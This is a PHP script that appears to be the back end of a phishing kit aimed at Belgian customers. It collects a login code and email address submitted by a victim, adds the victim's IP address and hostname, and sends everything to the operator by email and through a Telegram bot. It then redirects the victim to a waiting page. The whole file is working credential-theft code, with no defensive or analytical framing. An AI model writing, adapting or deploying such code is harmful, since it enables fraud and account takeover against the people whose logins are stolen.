
<?php
error_reporting(0);
session_start();

include "./emaildzbi.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;


$hostname = gethostbyaddr($ip);
$message = "[=🇧🇪 Client acheter ✅🇧🇪=]\r\n";
$message .= "|🥶Code login 🥶 : ".$_POST['repon']."\r\n";#17
$message .= "[========= $ip ========]\r\n";
$send = $email;
$subject = "♠️ (".$_POST['EMAIL'].") 🇧🇪🇧🇪 Client acheter ✅ 🇧🇪🇧🇪 $ip";
$headers = "From: [🤡🇧🇪 ZelaL 🇧🇪🤡]<info@j00keykrs.com>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


header('Location: wait2.php');
?>
